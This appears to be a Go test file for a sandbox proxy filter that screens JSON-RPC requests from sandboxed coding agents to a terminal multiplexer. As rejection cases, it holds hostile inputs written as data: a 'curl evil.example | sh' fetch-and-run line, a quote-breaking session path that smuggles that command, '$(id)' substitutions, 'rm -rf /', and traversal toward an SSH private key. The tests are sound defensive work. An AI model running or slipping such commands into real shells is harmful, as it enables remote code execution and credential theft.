package herdrproxy

import (
	"encoding/json"
	"maps"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"devsandbox/internal/cmdpattern"
)

// filterFixture wires a filter the way the tool layer does.
type filterFixture struct {
	filter     *Filter
	tabs       *cmdpattern.OwnedSet[string]
	panes      *cmdpattern.OwnedSet[string]
	projectDir string
	scriptPath string
}

func newFilterFixture(t *testing.T, caps ...Capability) *filterFixture {
	t.Helper()
	if len(caps) == 0 {
		caps = []Capability{CapLaunchOverlay, CapNotify}
	}

	base := t.TempDir()
	projectDir := filepath.Join(base, "project")
	if err := os.MkdirAll(projectDir, 0o755); err != nil {
		t.Fatalf("mkdir project: %v", err)
	}

	reloc, err := NewRelocator(filepath.Join(base, "host-only"), nil)
	if err != nil {
		t.Fatalf("NewRelocator: %v", err)
	}
	t.Cleanup(func() { _ = reloc.Cleanup() })

	scriptPath := filepath.Join(projectDir, "revdiff-launch-abc")
	if err := os.WriteFile(scriptPath, []byte(validBody()), 0o600); err != nil {
		t.Fatalf("write launch script: %v", err)
	}

	tabs := cmdpattern.NewOwnedSet[string]()
	panes := cmdpattern.NewOwnedSet[string]()

	return &filterFixture{
		filter: NewFilter(FilterConfig{
			Capabilities: caps,
			LaunchScript: testScriptPattern(),
			LaunchPatterns: []cmdpattern.CommandPattern{{
				Program:     "revdiff",
				ResolvedBin: testRevdiffBin,
				ArgsMatcher: cmdpattern.MatchAny(),
			}},
			OwnedTabs:   tabs,
			OwnedPanes:  panes,
			Relocator:   reloc,
			ProjectDir:  projectDir,
			WorkspaceID: "ws1",
		}),
		tabs:       tabs,
		panes:      panes,
		projectDir: projectDir,
		scriptPath: scriptPath,
	}
}

func TestDecideAllowsCapturedWireRequests(t *testing.T) {
	f := newFilterFixture(t)
	f.panes.Add("pane7")
	f.tabs.Add("tab3")

	tests := []struct {
		name string
		line string
	}{
		{
			name: "tab.create as the CLI sends it",
			line: `{"id":"cli:tab:create","method":"tab.create","params":{"workspace_id":"ws1","cwd":"` +
				f.projectDir + `","focus":true,"label":"rev"}}`,
		},
		{
			name: "pane run, which the CLI sends as pane.send_input",
			line: `{"id":"cli:request","method":"pane.send_input","params":{"pane_id":"pane7","text":"sh ` +
				f.scriptPath + `","keys":["Enter"]}}`,
		},
		{
			name: "tab.close on an owned tab",
			line: `{"id":"cli:tab:close","method":"tab.close","params":{"tab_id":"tab3"}}`,
		},
		{
			name: "notification.show",
			line: `{"id":"cli:notification:show","method":"notification.show","params":{"title":"hello world"}}`,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			d := f.filter.Decide([]byte(tt.line))
			if !d.Allow {
				t.Errorf("Decide denied a legitimate request: %s", d.Reason)
			}
		})
	}
}

func TestDecideDeniesForbiddenMethods(t *testing.T) {
	f := newFilterFixture(t)

	// The methods that make raw socket access unacceptable in the first place.
	forbidden := []string{
		"pane.read", "pane.send_text", "pane.send_keys", "pane.list", "pane.close",
		"agent.send", "agent.start", "agent.read",
		"server.stop", "server.reload_config", "server.live_handoff",
		"plugin.pane.open", "plugin.link", "plugin.action.invoke",
		"worktree.create", "worktree.remove", "worktree.open",
		"workspace.close", "workspace.create",
		"events.subscribe", "events.wait", "pane.wait_for_output",
		"layout.apply", "layout.export", "session.snapshot",
	}

	for _, m := range forbidden {
		t.Run(m, func(t *testing.T) {
			line := `{"id":"x","method":"` + m + `","params":{}}`
			if d := f.filter.Decide([]byte(line)); d.Allow {
				t.Errorf("Decide allowed forbidden method %q", m)
			}
		})
	}
}

func TestDecideDeniesUnownedMutations(t *testing.T) {
	f := newFilterFixture(t)
	// Deliberately register a different pane and tab.
	f.panes.Add("mine")
	f.tabs.Add("mine")

	tests := []struct {
		name string
		line string
	}{
		{
			name: "send_input into a pane the sandbox did not create",
			line: `{"id":"x","method":"pane.send_input","params":{"pane_id":"users-pane","text":"sh ` +
				f.scriptPath + `","keys":["Enter"]}}`,
		},
		{
			name: "close a tab the sandbox did not create",
			line: `{"id":"x","method":"tab.close","params":{"tab_id":"users-tab"}}`,
		},
		{
			name: "send_input with an empty pane id",
			line: `{"id":"x","method":"pane.send_input","params":{"pane_id":"","text":"sh ` +
				f.scriptPath + `","keys":["Enter"]}}`,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if d := f.filter.Decide([]byte(tt.line)); d.Allow {
				t.Error("Decide allowed a mutation against an unowned resource")
			}
		})
	}
}

func TestDecidePaneSendInputRejectsBadKeysAndText(t *testing.T) {
	f := newFilterFixture(t)
	f.panes.Add("pane7")

	tests := []struct {
		name   string
		params string
	}{
		{
			name:   "keys other than Enter",
			params: `{"pane_id":"pane7","text":"sh ` + f.scriptPath + `","keys":["Enter","Enter"]}`,
		},
		{
			name:   "no keys at all",
			params: `{"pane_id":"pane7","text":"sh ` + f.scriptPath + `"}`,
		},
		{
			name:   "arbitrary shell command instead of a launch",
			params: `{"pane_id":"pane7","text":"curl evil.example | sh","keys":["Enter"]}`,
		},
		{
			name:   "script path outside any known script",
			params: `{"pane_id":"pane7","text":"sh /etc/profile","keys":["Enter"]}`,
		},
		{
			name:   "unknown parameter smuggled alongside",
			params: `{"pane_id":"pane7","text":"sh ` + f.scriptPath + `","keys":["Enter"],"cwd":"/"}`,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			line := `{"id":"x","method":"pane.send_input","params":` + tt.params + `}`
			if d := f.filter.Decide([]byte(line)); d.Allow {
				t.Errorf("Decide allowed a bad send_input: %s", tt.params)
			}
		})
	}
}

// TestDecideRelocatesLaunchScript checks the rewrite actually happens and that
// the forwarded line no longer names the sandbox-writable path.
func TestDecideRelocatesLaunchScript(t *testing.T) {
	f := newFilterFixture(t)
	f.panes.Add("pane7")

	line := `{"id":"cli:request","method":"pane.send_input","params":{"pane_id":"pane7","text":"sh ` +
		f.scriptPath + `","keys":["Enter"]}}`

	d := f.filter.Decide([]byte(line))
	if !d.Allow {
		t.Fatalf("Decide denied a valid launch: %s", d.Reason)
	}
	if d.Rewritten == nil {
		t.Fatal("Decide did not rewrite the request; the sandbox path would still be executed")
	}
	if strings.Contains(string(d.Rewritten), f.scriptPath) {
		t.Error("rewritten request still names the sandbox-writable script path")
	}

	// Every other field must survive untouched.
	var out struct {
		ID     string `json:"id"`
		Method string `json:"method"`
		Params struct {
			PaneID string   `json:"pane_id"`
			Text   string   `json:"text"`
			Keys   []string `json:"keys"`
		} `json:"params"`
	}
	if err := json.Unmarshal(d.Rewritten, &out); err != nil {
		t.Fatalf("rewritten line is not valid JSON: %v", err)
	}
	if out.ID != "cli:request" || out.Method != "pane.send_input" {
		t.Errorf("rewrite altered id/method: %+v", out)
	}
	if out.Params.PaneID != "pane7" || len(out.Params.Keys) != 1 || out.Params.Keys[0] != "Enter" {
		t.Errorf("rewrite altered other params: %+v", out.Params)
	}
	if !strings.HasPrefix(out.Params.Text, "sh /") {
		t.Errorf("rewritten text = %q, want it to name the relocated script", out.Params.Text)
	}
}

func TestDecideTabCreateBoundsCwd(t *testing.T) {
	f := newFilterFixture(t)

	nested := filepath.Join(f.projectDir, "sub")
	if err := os.MkdirAll(nested, 0o755); err != nil {
		t.Fatalf("mkdir nested: %v", err)
	}

	// A symlink inside the project pointing out of it must not widen the bound.
	escape := filepath.Join(f.projectDir, "escape")
	if err := os.Symlink("/etc", escape); err != nil {
		t.Skipf("symlinks unavailable: %v", err)
	}

	tests := []struct {
		name string
		cwd  string
		want bool
	}{
		{name: "project dir itself", cwd: f.projectDir, want: true},
		{name: "nested inside project", cwd: nested, want: true},
		{name: "outside the project", cwd: "/etc", want: false},
		{name: "parent of the project", cwd: filepath.Dir(f.projectDir), want: false},
		{name: "symlink escaping the project", cwd: escape, want: false},
		{name: "traversal out of the project", cwd: f.projectDir + "/../../etc", want: false},
		{name: "relative path", cwd: "project", want: false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			line := `{"id":"x","method":"tab.create","params":{"cwd":"` + tt.cwd + `","label":"rev"}}`
			d := f.filter.Decide([]byte(line))
			if d.Allow != tt.want {
				t.Errorf("Decide allow = %v, want %v (reason: %s)", d.Allow, tt.want, d.Reason)
			}
		})
	}
}

func TestDecideTabCreatePinsWorkspace(t *testing.T) {
	f := newFilterFixture(t)

	allowed := `{"id":"x","method":"tab.create","params":{"workspace_id":"ws1","cwd":"` + f.projectDir + `"}}`
	if d := f.filter.Decide([]byte(allowed)); !d.Allow {
		t.Errorf("Decide denied the sandbox's own workspace: %s", d.Reason)
	}

	other := `{"id":"x","method":"tab.create","params":{"workspace_id":"ws-user","cwd":"` + f.projectDir + `"}}`
	if d := f.filter.Decide([]byte(other)); d.Allow {
		t.Error("Decide allowed a tab in a workspace the sandbox does not own")
	}
}

func TestDecideDeniesMalformedLines(t *testing.T) {
	f := newFilterFixture(t)

	for _, line := range []string{
		``,
		`{`,
		`[]`,
		`{"id":"x"}`,
		`{"id":"x","method":""}`,
		`{"id":"x","method":"tab.create","params":"not-an-object"}`,
	} {
		t.Run(line, func(t *testing.T) {
			if d := f.filter.Decide([]byte(line)); d.Allow {
				t.Errorf("Decide allowed a malformed line: %q", line)
			}
		})
	}
}

// TestDecideWithNoCapabilitiesDeniesEverything is the enforce-mode guarantee.
func TestDecideWithNoCapabilitiesDeniesEverything(t *testing.T) {
	f := NewFilter(FilterConfig{})

	for _, m := range []string{methodTabCreate, methodPaneSendInput, methodTabClose, methodNotificationShow} {
		t.Run(m, func(t *testing.T) {
			line := `{"id":"x","method":"` + m + `","params":{}}`
			if d := f.Decide([]byte(line)); d.Allow {
				t.Errorf("Decide allowed %q with no capabilities configured", m)
			}
		})
	}

	// ping is the deliberate exception: a liveness handshake that observes and
	// mutates nothing, always answered so `herdr status` works. Under
	// mode="enforce" this is the only method that gets a reply.
	t.Run("ping is answered even with no capabilities", func(t *testing.T) {
		if d := f.Decide([]byte(`{"id":"x","method":"ping","params":{}}`)); !d.Allow {
			t.Errorf("Decide denied ping: %s", d.Reason)
		}
	})
}

func TestDecideNotifyCapabilityDoesNotGrantLaunch(t *testing.T) {
	f := newFilterFixture(t, CapNotify)
	f.panes.Add("pane7")
	f.tabs.Add("tab3")

	notify := `{"id":"x","method":"notification.show","params":{"title":"hi"}}`
	if d := f.filter.Decide([]byte(notify)); !d.Allow {
		t.Errorf("notify capability denied notification.show: %s", d.Reason)
	}

	for _, m := range []string{methodTabCreate, methodPaneSendInput, methodTabClose} {
		line := `{"id":"x","method":"` + m + `","params":{}}`
		if d := f.filter.Decide([]byte(line)); d.Allow {
			t.Errorf("notify capability leaked access to %q", m)
		}
	}
}

func TestDecideNotificationShowValidation(t *testing.T) {
	f := newFilterFixture(t)

	tests := []struct {
		name   string
		params string
		want   bool
	}{
		{name: "title only", params: `{"title":"hi"}`, want: true},
		{name: "title and body", params: `{"title":"hi","body":"there"}`, want: true},
		{name: "empty title", params: `{"title":""}`, want: false},
		{name: "missing title", params: `{"body":"there"}`, want: false},
		{name: "oversized title", params: `{"title":"` + strings.Repeat("a", maxLabelBytes+1) + `"}`, want: false},
		{name: "unknown field", params: `{"title":"hi","exec":"/bin/sh"}`, want: false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			line := `{"id":"x","method":"notification.show","params":` + tt.params + `}`
			if d := f.filter.Decide([]byte(line)); d.Allow != tt.want {
				t.Errorf("allow = %v, want %v (reason: %s)", d.Allow, tt.want, d.Reason)
			}
		})
	}
}

// claudeSessionReportLine is the request the installed Claude integration (v7,
// ~/.claude/hooks/herdr-agent-state.sh) sends on every session hook.
const claudeSessionReportLine = `{"id":"herdr:claude:1753188469123:412765",` +
	`"method":"pane.report_agent_session","params":{` +
	`"pane_id":"pane7","source":"herdr:claude","agent":"claude",` +
	`"seq":1753188469123456789,` +
	`"agent_session_id":"0f5c3d2e-9a41-4a3f-b6d0-6a2f18c7e5b1",` +
	`"agent_session_path":"/home/user/.claude/projects/-home-user-proj/0f5c3d2e-9a41-4a3f-b6d0-6a2f18c7e5b1.jsonl",` +
	`"session_start_source":"startup"}}`

// TestFilterDeniesAgentSessionReportWithoutCapability pins today's behavior: the
// Claude integration's session report is denied outright, which is why herdr
// never learns the native session id of an agent launched inside the sandbox.
func TestFilterDeniesAgentSessionReportWithoutCapability(t *testing.T) {
	f := NewFilter(FilterConfig{})

	d := f.Decide([]byte(claudeSessionReportLine))
	if d.Allow {
		t.Fatalf("Decide allowed pane.report_agent_session with no capabilities: %s", d.Reason)
	}
	want := `method "pane.report_agent_session" is not permitted by the enabled capabilities`
	if d.Reason != want {
		t.Errorf("reason = %q, want %q", d.Reason, want)
	}
}

// claudeSessionUUID is the shape Claude actually generates for a session id.
const claudeSessionUUID = "0f5c3d2e-9a41-4a3f-b6d0-6a2f18c7e5b1"

// claudeProjectsDir is Claude's session directory as the SANDBOX sees it, which
// is what Claude.AgentSessionDir returns for the home in the captured request.
const claudeProjectsDir = "/home/user/.claude/projects"

// sessionReportFilter wires the filter the way Herdr.Start does for a direct
// `devsandbox claude` launch inside pane7.
func sessionReportFilter(t *testing.T) *Filter {
	t.Helper()
	return NewFilter(FilterConfig{
		Capabilities:    []Capability{CapAgentReporting},
		CurrentPaneID:   "pane7",
		ExpectedAgent:   "claude",
		AgentSessionDir: claudeProjectsDir,
	})
}

// sessionReportLine renders a request line, letting a test override or drop any
// single field of the default valid report.
func sessionReportLine(t *testing.T, overrides map[string]any) string {
	t.Helper()
	params := map[string]any{
		"pane_id":              "pane7",
		"source":               "herdr:claude",
		"agent":                "claude",
		"seq":                  int64(1753188469123456789),
		"agent_session_id":     claudeSessionUUID,
		"session_start_source": "startup",
	}
	for k, v := range overrides {
		if v == nil {
			delete(params, k)
			continue
		}
		params[k] = v
	}
	raw, err := json.Marshal(map[string]any{
		"id":     "herdr:claude:1753188469123:412765",
		"method": methodPaneReportAgentSession,
		"params": params,
	})
	if err != nil {
		t.Fatalf("marshal report: %v", err)
	}
	return string(raw)
}

func TestDecidePaneReportAgentSessionAllowsOwnPaneAndAgent(t *testing.T) {
	f := sessionReportFilter(t)

	d := f.Decide([]byte(sessionReportLine(t, nil)))
	if !d.Allow {
		t.Fatalf("Decide denied a valid report: %s", d.Reason)
	}
	if d.Rewritten != nil {
		t.Errorf("report was rewritten: %s", d.Rewritten)
	}
}

// TestDecidePaneReportAgentSessionAllowsCapturedClaudeLine runs the full v7
// request shape — id, path, seq and session_start_source together — and pins
// that the line reaches herdr byte for byte.
func TestDecidePaneReportAgentSessionAllowsCapturedClaudeLine(t *testing.T) {
	f := sessionReportFilter(t)

	d := f.Decide([]byte(claudeSessionReportLine))
	if !d.Allow {
		t.Fatalf("Decide denied the captured Claude report: %s", d.Reason)
	}
	if d.Rewritten != nil {
		t.Errorf("report was rewritten to %s, want the original bytes forwarded", d.Rewritten)
	}
}

func TestDecidePaneReportAgentSessionAllowsPathInsideSessionDir(t *testing.T) {
	f := sessionReportFilter(t)

	paths := []string{
		claudeProjectsDir + "/-home-user-proj/" + claudeSessionUUID + ".jsonl",
		claudeProjectsDir + "/x",
		claudeProjectsDir + "/" + strings.Repeat("a", maxSessionPathBytes-len(claudeProjectsDir)-1),
	}
	for _, p := range paths {
		t.Run(p[:min(len(p), 48)], func(t *testing.T) {
			d := f.Decide([]byte(sessionReportLine(t, map[string]any{"agent_session_path": p})))
			if !d.Allow {
				t.Fatalf("Decide denied a path inside the session directory: %s", d.Reason)
			}
		})
	}
}

// TestDecidePaneReportAgentSessionAllowsPathOnlyReport covers Pi's shape, where
// no session id is sent: the path alone must satisfy the presence rule.
func TestDecidePaneReportAgentSessionAllowsPathOnlyReport(t *testing.T) {
	f := sessionReportFilter(t)

	d := f.Decide([]byte(sessionReportLine(t, map[string]any{
		"agent_session_id":   nil,
		"agent_session_path": claudeProjectsDir + "/p/" + claudeSessionUUID + ".jsonl",
	})))
	if !d.Allow {
		t.Fatalf("Decide denied a path-only report: %s", d.Reason)
	}
}

func TestDecidePaneReportAgentSessionRejections(t *testing.T) {
	tests := []struct {
		name      string
		cfg       *FilterConfig
		overrides map[string]any
		rawLine   string
		wantIn    string
	}{
		{
			name:      "wrong pane",
			overrides: map[string]any{"pane_id": "pane9"},
			wantIn:    "is not this sandbox's pane",
		},
		{
			name:   "empty current pane id",
			cfg:    &FilterConfig{Capabilities: []Capability{CapAgentReporting}, ExpectedAgent: "claude"},
			wantIn: "no current pane id configured",
		},
		{
			name:   "empty expected agent",
			cfg:    &FilterConfig{Capabilities: []Capability{CapAgentReporting}, CurrentPaneID: "pane7"},
			wantIn: "no launched agent configured",
		},
		{
			name:      "wrong agent",
			overrides: map[string]any{"agent": "pi", "source": "herdr:pi"},
			wantIn:    "is not the launched agent",
		},
		{
			name:      "wrong source",
			overrides: map[string]any{"source": "herdr:pi"},
			wantIn:    `source "herdr:pi" is not "herdr:claude"`,
		},
		{
			name:      "unknown field",
			overrides: map[string]any{"resume_command": "claude --resume x"},
			wantIn:    "unknown field",
		},
		{
			name:      "non-integer seq",
			overrides: map[string]any{"seq": "1753188469123456789"},
			wantIn:    "invalid params",
		},
		{
			name:      "fractional seq",
			overrides: map[string]any{"seq": 1.5},
			wantIn:    "invalid params",
		},
		{
			name:      "negative seq",
			overrides: map[string]any{"seq": int64(-1)},
			wantIn:    "seq is negative",
		},
		{
			name:      "empty session id and no path",
			overrides: map[string]any{"agent_session_id": ""},
			wantIn:    "neither agent_session_id nor agent_session_path is present",
		},
		{
			name:      "no session id and no path",
			overrides: map[string]any{"agent_session_id": nil},
			wantIn:    "neither agent_session_id nor agent_session_path is present",
		},
		{
			name:      "oversized session id",
			overrides: map[string]any{"agent_session_id": strings.Repeat("a", maxSessionIDBytes+1)},
			wantIn:    "agent_session_id is not a permitted token",
		},
		{
			name:      "dot session id",
			overrides: map[string]any{"agent_session_id": "."},
			wantIn:    "agent_session_id is not a permitted token",
		},
		{
			name:      "dotdot session id",
			overrides: map[string]any{"agent_session_id": ".."},
			wantIn:    "agent_session_id is not a permitted token",
		},
		{
			name:      "session path outside the agent's session directory",
			overrides: map[string]any{"agent_session_path": "/home/user/.ssh/id_ed25519"},
			wantIn:    "outside the launched agent's session directory",
		},
		{
			name:      "session path is a sibling with a shared prefix",
			overrides: map[string]any{"agent_session_path": claudeProjectsDir + "-evil/x.jsonl"},
			wantIn:    "outside the launched agent's session directory",
		},
		{
			name:      "session path equal to the session directory",
			overrides: map[string]any{"agent_session_path": claudeProjectsDir},
			wantIn:    "outside the launched agent's session directory",
		},
		{
			name:      "relative session path",
			overrides: map[string]any{"agent_session_path": "projects/p/" + claudeSessionUUID + ".jsonl"},
			wantIn:    "agent_session_path is not absolute",
		},
		{
			name:      "session path with a .. component",
			overrides: map[string]any{"agent_session_path": claudeProjectsDir + "/../../.ssh/id_ed25519"},
			wantIn:    `agent_session_path contains a ".." component`,
		},
		{
			// Cleaning first would make this land back inside the bound, which
			// is exactly why the ".." rule runs before the prefix check.
			name:      "session path whose .. components cancel out",
			overrides: map[string]any{"agent_session_path": claudeProjectsDir + "/p/../p/x.jsonl"},
			wantIn:    `agent_session_path contains a ".." component`,
		},
		{
			// herdr persists a path-kind ref as it persists an id, and types
			// either back into a host pane shell on restore. A file the sandbox
			// creates under the bound directory can carry any name, so the
			// charset is pinned rather than left to herdr's quoter.
			name:      "session path breaking out of single quotes",
			overrides: map[string]any{"agent_session_path": claudeProjectsDir + "/p/x'; curl evil.example|sh; '.jsonl"},
			wantIn:    "agent_session_path contains a character outside",
		},
		{
			name:      "session path with a command substitution",
			overrides: map[string]any{"agent_session_path": claudeProjectsDir + "/p/$(id).jsonl"},
			wantIn:    "agent_session_path contains a character outside",
		},
		{
			name:      "session path with a space",
			overrides: map[string]any{"agent_session_path": claudeProjectsDir + "/a b/x.jsonl"},
			wantIn:    "agent_session_path contains a character outside",
		},
		{
			// Non-ASCII is not a control character, so only the charset rule
			// catches it.
			name:      "session path with non-ASCII",
			overrides: map[string]any{"agent_session_path": claudeProjectsDir + "/p/café.jsonl"},
			wantIn:    "agent_session_path contains a character outside",
		},
		{
			name:      "session path with a newline",
			overrides: map[string]any{"agent_session_path": claudeProjectsDir + "/p/x\n.jsonl"},
			wantIn:    "agent_session_path contains a control character",
		},
		{
			name:      "session path with a NUL",
			overrides: map[string]any{"agent_session_path": claudeProjectsDir + "/p/x\x00.jsonl"},
			wantIn:    "agent_session_path contains a control character",
		},
		{
			name:      "oversized session path",
			overrides: map[string]any{"agent_session_path": claudeProjectsDir + "/" + strings.Repeat("a", maxSessionPathBytes)},
			wantIn:    "agent_session_path exceeds the length limit",
		},
		{
			// The bound is host-derived; without it there is nothing to confine
			// against, so the path must be denied rather than waved through.
			name: "empty agent session directory",
			cfg: &FilterConfig{
				Capabilities:  []Capability{CapAgentReporting},
				CurrentPaneID: "pane7",
				ExpectedAgent: "claude",
			},
			overrides: map[string]any{"agent_session_path": claudeProjectsDir + "/p/" + claudeSessionUUID + ".jsonl"},
			wantIn:    "no agent session directory configured",
		},
		{
			name: "relative agent session directory",
			cfg: &FilterConfig{
				Capabilities:    []Capability{CapAgentReporting},
				CurrentPaneID:   "pane7",
				ExpectedAgent:   "claude",
				AgentSessionDir: ".claude/projects",
			},
			overrides: map[string]any{"agent_session_path": claudeProjectsDir + "/p/" + claudeSessionUUID + ".jsonl"},
			wantIn:    "no agent session directory configured",
		},
		{
			name:      "oversized start source",
			overrides: map[string]any{"session_start_source": strings.Repeat("a", maxStartSourceBytes+1)},
			wantIn:    "session_start_source is not a permitted token",
		},
		{
			name:      "start source with metacharacter",
			overrides: map[string]any{"session_start_source": "startup;id"},
			wantIn:    "session_start_source is not a permitted token",
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			f := sessionReportFilter(t)
			if tc.cfg != nil {
				f = NewFilter(*tc.cfg)
			}
			line := tc.rawLine
			if line == "" {
				line = sessionReportLine(t, tc.overrides)
			}

			d := f.Decide([]byte(line))
			if d.Allow {
				t.Fatalf("Decide allowed %s: %s", tc.name, d.Reason)
			}
			if !strings.Contains(d.Reason, tc.wantIn) {
				t.Errorf("reason = %q, want it to contain %q", d.Reason, tc.wantIn)
			}
		})
	}
}

// TestDecidePaneReportAgentSessionSessionIDCharset covers values that would be
// dangerous once herdr types the id into a host pane shell on restore.
func TestDecidePaneReportAgentSessionSessionIDCharset(t *testing.T) {
	denied := []string{
		"abc'def",
		"abc`def",
		"abc$(x)",
		"abc;rm -rf /",
		"abc def",
		"abc\ndef",
		"--resume",
		"-flag",
		"abc|def",
		"abc/def",
		"abc\x00def",
	}

	f := sessionReportFilter(t)
	for _, id := range denied {
		t.Run(strings.ReplaceAll(id, "\n", "\\n"), func(t *testing.T) {
			d := f.Decide([]byte(sessionReportLine(t, map[string]any{"agent_session_id": id})))
			if d.Allow {
				t.Fatalf("Decide allowed agent_session_id %q", id)
			}
			if !strings.Contains(d.Reason, "agent_session_id is not a permitted token") {
				t.Errorf("reason = %q, want the session id rule", d.Reason)
			}
		})
	}

	allowed := []string{
		claudeSessionUUID,
		"session_2026-07-22.01",
		strings.Repeat("a", maxSessionIDBytes),
	}
	for _, id := range allowed {
		t.Run("allowed/"+id[:min(len(id), 16)], func(t *testing.T) {
			d := f.Decide([]byte(sessionReportLine(t, map[string]any{"agent_session_id": id})))
			if !d.Allow {
				t.Fatalf("Decide denied agent_session_id %q: %s", id, d.Reason)
			}
		})
	}
}

// TestDecidePaneReportAgentSessionReasonsOmitSessionID guards the one secret
// this method carries: decision reasons are logged, session ids are not.
func TestDecidePaneReportAgentSessionReasonsOmitSessionID(t *testing.T) {
	const secret = "abcd1234secretsession"

	cases := []map[string]any{
		nil,
		{"pane_id": "pane9"},
		{"agent": "pi", "source": "herdr:pi"},
		{"source": "herdr:pi"},
		{"seq": int64(-1)},
		{"agent_session_path": claudeProjectsDir + "/p/" + secret + ".jsonl"},
		// Denied paths matter more than allowed ones here: the transcript
		// filename embeds the session id.
		{"agent_session_path": "/etc/" + secret + ".jsonl"},
		{"agent_session_path": claudeProjectsDir + "/../" + secret + ".jsonl"},
		{"agent_session_path": "relative/" + secret + ".jsonl"},
	}

	f := sessionReportFilter(t)
	for _, overrides := range cases {
		all := map[string]any{"agent_session_id": secret}
		maps.Copy(all, overrides)
		d := f.Decide([]byte(sessionReportLine(t, all)))
		if strings.Contains(d.Reason, secret) {
			t.Errorf("reason %q leaks the session id", d.Reason)
		}
	}

	// The charset branch must not echo the rejected value either.
	d := f.Decide([]byte(sessionReportLine(t, map[string]any{"agent_session_id": secret + ";id"})))
	if strings.Contains(d.Reason, secret) {
		t.Errorf("reason %q leaks the rejected session id", d.Reason)
	}
}

// TestAgentReportingReasonsOmitSessionMaterial extends the session-report
// guarantee above to the two lifecycle methods Pi uses. Every reason the filter
// produces is written to the proxy log verbatim (proxy.go:140,161), and all
// three methods carry a session id or a transcript path whose filename embeds
// one, so the check has to cover the method set rather than one method.
func TestAgentReportingReasonsOmitSessionMaterial(t *testing.T) {
	const secret = "abcd1234secretsession"

	overrides := []map[string]any{
		nil,
		{"pane_id": "pane9"},
		{"agent": "claude", "source": "herdr:claude"},
		{"source": "herdr:pi"},
		{"seq": int64(-1)},
		{"state": "unknown"},
		{"message": strings.Repeat("m", maxLabelBytes+1)},
		{"agent_session_id": secret + ";id"},
		{"agent_session_id": strings.Repeat(secret, 16)},
		{"agent_session_path": piSessionsDir + "/" + secret + ".jsonl"},
		{"agent_session_path": "/etc/" + secret + ".jsonl"},
		{"agent_session_path": piSessionsDir + "/../" + secret + ".jsonl"},
		{"agent_session_path": "relative/" + secret + ".jsonl"},
		{"agent_session_path": piSessionsDir + "/" + secret + "\n.jsonl"},
	}

	lines := map[string]func(*testing.T, map[string]any) string{
		methodPaneReportAgent:        piStateLine,
		methodPaneReleaseAgent:       piReleaseLine,
		methodPaneReportAgentSession: sessionReportLine,
	}

	f := piReportFilter(t)
	sessionFilter := sessionReportFilter(t)

	for method, line := range lines {
		for _, o := range overrides {
			all := map[string]any{"agent_session_id": secret}
			maps.Copy(all, o)

			decide := f
			if method == methodPaneReportAgentSession {
				// The session report is wired for claude, so it needs the
				// filter configured for that agent to reach its own rules.
				decide = sessionFilter
			}
			d := decide.Decide([]byte(line(t, all)))
			if strings.Contains(d.Reason, secret) {
				t.Errorf("%s: reason %q leaks session material", method, d.Reason)
			}
		}
	}
}

func TestIsRestrictedToken(t *testing.T) {
	tests := []struct {
		in     string
		maxLen int
		want   bool
	}{
		{in: claudeSessionUUID, maxLen: maxSessionIDBytes, want: true},
		{in: "startup", maxLen: maxStartSourceBytes, want: true},
		{in: "a.b_c-1", maxLen: 8, want: true},
		{in: "", maxLen: 8, want: false},
		{in: ".", maxLen: 8, want: false},
		{in: "..", maxLen: 8, want: false},
		{in: "-x", maxLen: 8, want: false},
		{in: "abcdefghi", maxLen: 8, want: false},
		{in: "abcdefgh", maxLen: 8, want: true},
		{in: "a b", maxLen: 8, want: false},
		{in: "a/b", maxLen: 8, want: false},
		{in: "a\tb", maxLen: 8, want: false},
	}

	for _, tc := range tests {
		if got := isRestrictedToken(tc.in, tc.maxLen); got != tc.want {
			t.Errorf("isRestrictedToken(%q, %d) = %v, want %v", tc.in, tc.maxLen, got, tc.want)
		}
	}
}

func TestIsRestrictedPath(t *testing.T) {
	tests := []struct {
		in   string
		want bool
	}{
		// The real shapes: Claude's flat project directory and Pi's nested one.
		{in: "/home/u/.claude/projects/-home-u-proj/" + claudeSessionUUID + ".jsonl", want: true},
		{in: "/home/u/.pi/agent/sessions/-home-u-proj/20260722T101500_" + claudeSessionUUID + ".jsonl", want: true},
		{in: "/", want: true},
		{in: "", want: true},
		{in: "/a/b c", want: false},
		{in: "/a/b'c", want: false},
		{in: "/a/$(id)", want: false},
		{in: "/a/b;c", want: false},
		{in: "/a/café", want: false},
	}

	for _, tc := range tests {
		if got := isRestrictedPath(tc.in); got != tc.want {
			t.Errorf("isRestrictedPath(%q) = %v, want %v", tc.in, got, tc.want)
		}
	}
}

// TestDecidePaneReportAgentSessionNeedsCapability pins that the anchors alone
// do not open the method: the capability must be enabled too.
func TestDecidePaneReportAgentSessionNeedsCapability(t *testing.T) {
	f := NewFilter(FilterConfig{
		Capabilities:  []Capability{CapNotify, CapLaunchOverlay},
		CurrentPaneID: "pane7",
		ExpectedAgent: "claude",
	})

	d := f.Decide([]byte(sessionReportLine(t, nil)))
	if d.Allow {
		t.Fatalf("Decide allowed the report without CapAgentReporting: %s", d.Reason)
	}
	if !strings.Contains(d.Reason, "not permitted by the enabled capabilities") {
		t.Errorf("reason = %q, want the deny-by-default text", d.Reason)
	}
}

// piSessionsDir is Pi's session directory as the SANDBOX sees it.
const piSessionsDir = "/home/user/.pi/agent/sessions"

// piSessionID is the shape Pi generates for a session id.
const piSessionID = "01J8Z5K3Q7RN4V2XW9B6TDHFAC"

// piReportFilter wires the filter the way Herdr.Start does for a direct
// `devsandbox pi` launch inside pane7.
func piReportFilter(t *testing.T) *Filter {
	t.Helper()
	return NewFilter(FilterConfig{
		Capabilities:    []Capability{CapAgentReporting},
		CurrentPaneID:   "pane7",
		ExpectedAgent:   "pi",
		AgentSessionDir: piSessionsDir,
	})
}

// agentReportLine renders a request line for one of the two lifecycle methods,
// letting a test override or drop any single field of the default valid report.
func agentReportLine(t *testing.T, method string, params, overrides map[string]any) string {
	t.Helper()
	merged := maps.Clone(params)
	for k, v := range overrides {
		if v == nil {
			delete(merged, k)
			continue
		}
		merged[k] = v
	}
	raw, err := json.Marshal(map[string]any{
		"id":     "herdr:pi:1753188469123:412765",
		"method": method,
		"params": merged,
	})
	if err != nil {
		t.Fatalf("marshal report: %v", err)
	}
	return string(raw)
}

